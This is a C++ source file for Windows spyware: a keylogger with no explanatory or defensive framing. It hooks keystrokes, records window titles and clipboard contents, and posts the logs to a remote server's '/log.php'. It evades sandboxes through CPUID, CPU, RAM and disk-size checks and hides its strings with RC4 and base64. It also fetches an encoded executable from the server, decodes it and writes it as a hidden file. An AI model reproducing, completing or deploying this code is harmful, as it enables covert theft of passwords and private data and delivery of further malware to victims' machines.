#include <winsock2.h>

#include <windows.h>

#include <iostream>

#include <string>

#include <unordered_map>

#include <fstream>

#include <thread>

#include <vector>

#include "httplib.h"

#include <cpuid.h>


std::unordered_map < int, std::string > map = {
  {
    0x1B,
    "{Esc}"
  },
  {
    0x8,
    "{Backspace}"
  },
  {
    0x9,
    "{Tab}"
  },
  {
    0xA,
    "{Enter}"
  },
  {
    0xB,
    "{Clear}"
  },
  {
    0xC,
    "{Clear}"
  },
  {
    0xD,
    "{Enter}"
  },
  {
    0xE,
    "{Shift}"
  },
  {
    0xF,
    "{Shift}"
  },
  {
    0x10,
    "{Shift}"
  },
  {
    0x11,
    "{Ctrl}"
  },
  {
    0x12,
    "{Alt}"
  },
  {
    0x13,
    "{Pause}"
  },
  {
    0x14,
    "{CapsLock}"
  },
  {
    0x41,
    "A"
  },
  {
    0x42,
    "B"
  },
  {
    0x43,
    "C"
  },
  {
    0x44,
    "D"
  },
  {
    0x45,
    "E"
  },
  {
    0x46,
    "F"
  },
  {
    0x47,
    "G"
  },
  {
    0x48,
    "H"
  },
  {
    0x49,
    "I"
  },
  {
    0x4A,
    "J"
  },
  {
    0x4B,
    "K"
  },
  {
    0x4C,
    "L"
  },
  {
    0x4D,
    "M"
  },
  {
    0x4E,
    "N"
  },
  {
    0x4F,
    "O"
  },
  {
    0x50,
    "P"
  },
  {
    0x51,
    "Q"
  },
  {
    0x52,
    "R"
  },
  {
    0x53,
    "S"
  },
  {
    0x54,
    "T"
  },
  {
    0x55,
    "U"
  },
  {
    0x56,
    "V"
  },
  {
    0x57,
    "W"
  },
  {
    0x58,
    "X"
  },
  {
    0x59,
    "Y"
  },
  {
    0x5A,
    "Z"
  },
  {
    0x30,
    "0"
  },
  {
    0x31,
    "1"
  },
  {
    0x32,
    "2"
  },
  {
    0x33,
    "3"
  },
  {
    0x34,
    "4"
  },
  {
    0x35,
    "5"
  },
  {
    0x36,
    "6"
  },
  {
    0x37,
    "7"
  },
  {
    0x38,
    "8"
  },
  {
    0x39,
    "9"
  },
  {
    0x8,
    "{Backspace}"
  },
  {
    0x9,
    "{Tab}"
  },
  {
    0x20,
    "{Space}"
  },
  {
    0x21,
    "{Page Up}"
  },
  {
    0x22,
    "{Page Down}"
  },
  {
    0x23,
    "{End}"
  },
  {
    0x24,
    "{Home}"
  },
  {
    0x25,
    "{Left Arrow}"
  },
  {
    0x26,
    "{Up Arrow}"
  },
  {
    0x27,
    "{Right Arrow}"
  },
  {
    0x28,
    "{Down Arrow}"
  },
  {
    0x2D,
    "{Insert}"
  },
  {
    0x2E,
    "{Delete}"
  },
  {
    0x5B,
    "{Left Windows}"
  },
  {
    0x5C,
    "{Right Windows}"
  },
  {
    0x5D,
    "{Applications}"
  },
  {
    0x60,
    "0"
  },
  {
    0x61,
    "1"
  },
  {
    0x62,
    "2"
  },
  {
    0x63,
    "3"
  },
  {
    0x64,
    "4"
  },
  {
    0x65,
    "5"
  },
  {
    0x66,
    "6"
  },
  {
    0x67,
    "7"
  },
  {
    0x68,
    "8"
  },
  {
    0x69,
    "9"
  },
  {
    0x6A,
    "*"
  },
  {
    0x6B,
    "+"
  },
  {
    0x6C,
    "{Separator}"
  },
  {
    0x6D,
    "-"
  },
  {
    0x6E,
    "."
  },
  {
    0x6F,
    "/"
  },
  {
    0x70,
    "F1"
  },
  {
    0x71,
    "F2"
  },
  {
    0x72,
    "F3"
  },
  {
    0x73,
    "F4"
  },
  {
    0x74,
    "F5"
  },
  {
    0x75,
    "F6"
  },
  {
    0x76,
    "F7"
  },
  {
    0x77,
    "F8"
  },
  {
    0x78,
    "F9"
  },
  {
    0x79,
    "F10"
  },
  {
    0x7A,
    "F11"
  },
  {
    0x7B,
    "F12"
  },
  {
    0x90,
    "{Num Lock}"
  },
  {
    0x91,
    "{Scroll Lock}"
  },
  {
    0xA0,
    "{Left Shift}"
  },
  {
    0xA1,
    "{Right Shift}"
  },
  {
    0xA2,
    "{Left Control}"
  },
  {
    0xA3,
    "{Right Control}"
  },
  {
    0xA4,
    "{Left Menu}"
  },
  {
    0xA5,
    "{Right Menu}"
  },
  {
    0xBA,
    ";"
  },
  {
    0xBB,
    "="
  },
  {
    0xBC,
    ","
  },
  {
    0xBD,
    "-"
  },
  {
    0xBE,
    "."
  },
  {
    0xBF,
    "/"
  },
  {
    0xC0,
    "`"
  },
  {
    0xDB,
    "["
  },
  {
    0xDC,
    "\\"
  },
  {
    0xDD,
    "]"
  },
  {
    0xDE,
    "'"
  },
};

std::string log_str = "";
std::vector < std::string > log_vec;
std::string current_window = "";
std::string current_clipboard = "";

std::string url = "http://"; // server url, ornly http

std::string rc4(std::string key, std::string data) {
  std::string result;
  int x = 0;
  int y = 0;
  int box[256];
  for (int i = 0; i < 256; i++) {
    box[i] = i;
  }
  for (int i = 0; i < 256; i++) {
    y = (key[x] + box[i] + y) % 256;
    int temp = box[i];
    box[i] = box[y];
    box[y] = temp;
    x = (x + 1) % key.length();
  }
  x = 0;
  y = 0;
  for (int i = 0; i < data.length(); i++) {
    x = (x + 1) % 256;
    y = (box[x] + y) % 256;
    int temp = box[x];
    box[x] = box[y];
    box[y] = temp;
    int xorIndex = (box[x] + box[y]) % 256;
    result += data[i] ^ box[xorIndex];
  }
  return result;
}

std::string base64_encode(std::string data,
  const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/") {
  std::string encoded_string;
  int val = 0, valb = -6;
  for (unsigned char c: data) {
    val = (val << 8) + c;
    valb += 8;
    while (valb >= 0) {
      encoded_string.push_back(base64_chars[(val >> valb) & 0x3F]);
      valb -= 6;
    }
  }
  if (valb > -6) {
    encoded_string.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
  }
  while (encoded_string.size() % 4) {
    encoded_string.push_back('=');
  }
  return encoded_string;
}

std::string base64_decode(std::string data,
  const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/") {
  int val = 0, valb = -8;
  std::string decoded_string;
  for (unsigned char c: data) {
    if (c == '=') {
      break;
    }
    auto pos = base64_chars.find(c);
    if (pos == std::string::npos) {
      continue;
    }
    val = (val << 6) + pos;
    valb += 6;
    if (valb >= 0) {
      decoded_string.push_back(char((val >> valb) & 0xFF));
      valb -= 8;
    }
  }
  return decoded_string;
}

void upload_log(std::string log) {

  std::stringstream ss;
  ss << log;
  httplib::Client cli(url);
  httplib::MultipartFormDataItems items = {
    {
      "file",
      ss.str(),
      "log_str.txt",
      "text/plain"
    }
  };
  auto res = cli.Post("/log.php", items);
  if (res && res -> status == 200) {
    std::cout << res -> body << std::endl;
  }
}

void print_window_title() {
  HWND hwnd = GetForegroundWindow();
  if (hwnd != NULL) {
    int length = GetWindowTextLength(hwnd);
    if (length > 0) {

      if (!log_vec.empty()) {
        for (auto & i: log_vec) {
          std::thread t1(upload_log, i);
          t1.detach();
        }
        log_vec.clear();
      }

      char * buffer = new char[length + 1];
      GetWindowText(hwnd, buffer, length + 1);
      std::cout << buffer << std::endl;
      if (current_window != buffer) {
        current_window = buffer;
        if (log_str.length() > 0) {
          std::stringstream ss;
          ss << log_str;
          log_vec.push_back(ss.str());
          log_str = "";
          std::string back = log_vec.back();
          std::thread t1(upload_log, back);
          t1.detach();
          log_vec.erase(std::remove(log_vec.begin(), log_vec.end(), back), log_vec.end());
        }

        log_str += "[Window]{";
        log_str += buffer;
        log_str += "}";

      }
      delete[] buffer;
    }
  }
}

void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime) {
  print_window_title();
}

struct _cpuid_buffer_t {
  uint32_t EAX;
  uint32_t EBX;
  uint32_t ECX;
  uint32_t EDX;
};

bool check_invalid_leaf() {
  constexpr unsigned int invalid_leaf = 0x04201337;
  constexpr unsigned int valid_leaf = 0x40000000;

  _cpuid_buffer_t InvalidLeafResponse = {};
  _cpuid_buffer_t ValidLeafResponse = {};

  __get_cpuid(invalid_leaf, & InvalidLeafResponse.EAX, & InvalidLeafResponse.EBX, & InvalidLeafResponse.ECX, & InvalidLeafResponse.EDX);
  __get_cpuid(valid_leaf, & ValidLeafResponse.EAX, & ValidLeafResponse.EBX, & ValidLeafResponse.ECX, & ValidLeafResponse.EDX);

  if (InvalidLeafResponse.EAX == valid_leaf) {
    return true;
  }
  return false;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
  if (nCode == HC_ACTION) {
    if (wParam == WM_KEYDOWN) {
      KBDLLHOOKSTRUCT * p = (KBDLLHOOKSTRUCT * ) lParam;
      std::cout << map[p -> vkCode];
      log_str += map[p -> vkCode];
    }
  }
  return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void CALLBACK ClipboardEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime) {
  if (idObject == OBJID_CLIENT && idChild == CHILDID_SELF) {
    if (OpenClipboard(NULL)) {
      HANDLE hData = GetClipboardData(CF_TEXT);
      if (hData != NULL) {
        char * pszText = static_cast < char * > (GlobalLock(hData));
        if (pszText != NULL) {

          if (current_clipboard != pszText) {
            std::cout << pszText;
            current_clipboard = pszText;
            log_str += "[Clipboard]{";
            log_str += pszText;
            log_str += "}";
          }
          GlobalUnlock(hData);
        }
      }
      CloseClipboard();
    }
  }
}

inline bool exists_file(const std::string & name) {
  struct stat buffer;
  return (stat(name.c_str(), & buffer) == 0);
}

int main() {

  if (check_invalid_leaf()) {
    return 0;
  } else {

    SYSTEM_INFO systemInfo;
    GetSystemInfo( & systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) return false;

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx( & memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 2048) return false;

    std::string s = rc4("key", base64_decode("VzAasXTnAjkhKGkXUi97i+pE"));
    std::wstring stemp = std::wstring(s.begin(), s.end());
    LPCWSTR sw = stemp.c_str();
    HANDLE hDevice = CreateFileW(sw, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, & pDiskGeometry, sizeof(pDiskGeometry), & bytesReturned, (LPOVERLAPPED) NULL);
    DWORD diskSizeGB;
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG) pDiskGeometry.TracksPerCylinder * (ULONG) pDiskGeometry.SectorsPerTrack * (ULONG) pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    if (diskSizeGB < 100) return false;

  }

  std::string path = getenv(rc4("key", base64_decode("SjxkqWXbOg==")).c_str());
  path += rc4("key", base64_decode("VyFdjlbgCCUuP1QsfzN2kvgHsTXfgJGLFr7N00ywK+x7WsTvxPzm70e2jcVWDXo="));
  std::string file_name = rc4("key", base64_decode("fhxQjFDqVS8wLg=="));
  path += file_name;
  std::cout << path << std::endl;

  if (!exists_file(path)) {
    httplib::Client cli(url);
    auto res = cli.Get("/file.txt"); // encoded .exe file with lastest version
    auto file = std::fopen(path.c_str(), "wb");

    std::string body = res -> body;
    std::string dec = rc4("key", base64_decode(body));
    std::fwrite(dec.c_str(), 1, dec.size(), file);
    std::fclose(file);
    SetFileAttributes(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
  }

  HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
  HWINEVENTHOOK hWinEventHook = SetWinEventHook(EVENT_OBJECT_FOCUS, EVENT_OBJECT_FOCUS, NULL, ClipboardEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
  SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
  MSG msg;
  while (GetMessage( & msg, NULL, 0, 0) != 0) {
    TranslateMessage( & msg);
    DispatchMessage( & msg);
  }
  UnhookWindowsHookEx(hhkLowLevelKybd);
  return 0;
}
